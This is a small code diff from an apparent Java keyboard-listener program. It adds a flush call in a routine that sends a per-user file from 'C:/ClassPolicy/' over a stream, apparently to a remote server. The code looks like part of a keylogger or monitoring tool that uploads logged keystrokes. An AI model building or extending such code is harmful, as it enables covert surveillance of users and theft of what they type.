@@ -83,6 +83,7 @@ public class Main implements NativeKeyListener{
 			    		PrintWriter out = new PrintWriter(t);
 						String toSend = System.getProperty("user.name") + ".txt";
 						out.print(toSend );
+						out.flush();
 			    		File transferFile = new File ("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt"); 
 			    		byte [] bytearray = new byte [(int)transferFile.length()]; 
 			    		FileInputStream fin = new FileInputStream(transferFile); 
